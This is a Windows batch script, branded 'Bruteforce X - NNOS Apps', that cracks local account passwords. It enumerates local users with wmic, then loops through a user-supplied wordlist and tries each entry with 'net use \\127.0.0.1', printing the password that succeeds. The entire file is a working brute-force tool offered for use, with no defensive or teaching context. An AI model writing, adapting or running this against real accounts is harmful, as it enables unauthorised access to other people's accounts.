@echo off
title Bruteforce X - NNOS Apps
setlocal enabledelayedexpansion
chcp 65001 >nul
:start
cls
set "error=-"
color 02
set "user="
set "wordlist="
echo.
echo.     ___.                 __          _____
echo.     \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
echo.      ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \        
echo.      ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/  \/ 
echo.      ^|_____/__^|  ^|____/ ^|__^|  \_____^>__^|  \____/^|__^|    \_____^>_____^> /\  
echo.
echo.   SYNTAX:
echo.   1. Users
echo.   2. Run
echo.   3. Clear
echo.   4. Exit
echo.
:input
set /p "choice=BF>> "
if "%choice%"=="1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)
if "%choice%"=="2" (
  goto bruteforce
)
if "%choice%"=="3" (
  cls
  goto start
)
if "%choice%"=="4" (
  exit
)

:bruteforce
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p "user=BF_Query>> "
echo.
echo [PASSWORD LIST]
set /p "wordlist=BF_Query>> "
if not exist "%wordlist%" (
  echo.
  echo [%error%]: File not found
  pause >nul
  goto start
)
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [%error%]: User doesn't exist
  pause >nul
  goto start
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "delims=" %%a in (%wordlist%) do (
  set "pass=%%a"
  call :varset
)
echo.
echo [%error%]: Password not found
pause >nul
goto start

:success
echo.
echo Password found: %pass%
net use \\127.0.0.1 /d /y >nul 2>&1
set "user="
set "pass="
echo.
pause >nul
goto start

:varset
net use \\127.0.0.1 /user:%user% !pass! 2>&1 | find "System error 1331" >nul
if %errorlevel%==0 (
    echo Password found: !pass!
    goto success
)
echo [ATTEMPT !count!] [!pass!]
set /a count+=1
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success
